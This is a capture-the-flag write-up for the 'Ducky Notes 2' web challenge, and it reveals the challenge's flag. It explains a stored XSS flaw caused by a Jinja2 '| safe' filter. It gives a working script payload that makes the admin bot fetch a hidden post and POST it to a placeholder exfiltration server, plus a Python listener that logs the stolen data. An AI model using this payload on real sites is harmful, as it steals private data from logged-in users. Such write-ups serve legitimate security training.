#### Challenge:

Quack quack! Try and huack me!

[ducky_notes_2.zip](./ducky_notes_2.zip ":ignore")

---

#### Solution:

This is very similar to `Baby Ducky Notes`, but this time the flag post has hidden property set to true, which means only the post author can see it. Luckily, there is an `XSS` vulnerability in the view post page (indicated in the `posts.html` template by `| safe` Jinja2 filter).

So we create a post with the following payload:

```html
<script>
fetch('/posts/view/admin', {credentials: "include"})
    .then(function(response) {
        return response.text()
    })
    .then(function(html) {
        fetch(
            "http://our-exfiltration-server-ip:8080/",
            {
                "body": JSON.stringify({data:html}),
                "method": "POST",
                headers: { 'Content-Type': 'application/json' }
            }
        )
    })
</script>
```

And report it so that the `Admin` bot triggers the XSS.
Then we just read the flag in the logs of our exfiltration web server. Note that the server should allow all `CORS` requests, e.g.:

```python
#!/usr/bin/env python3

from http.server import HTTPServer, SimpleHTTPRequestHandler
import sys
import logging

class RequestHandler(SimpleHTTPRequestHandler):

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', '*')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
        return super(RequestHandler, self).end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()
        logging.error(self.headers)

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        logging.error(self.headers)

    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        logging.error(self.headers)
        logging.error(str(post_data)+'\n\n')

host = sys.argv[1] if len(sys.argv) > 2 else '0.0.0.0'
port = int(sys.argv[len(sys.argv)-1]) if len(sys.argv) > 1 else 8080

print("Listening on {}:{}".format(host, port))
httpd = HTTPServer((host, port), RequestHandler)
httpd.serve_forever()
```

---

<details><summary>FLAG:</summary>

```
TFCCTF{Ev3ry_duCk_kn0w5_xSs!}
```

</details>
<br/>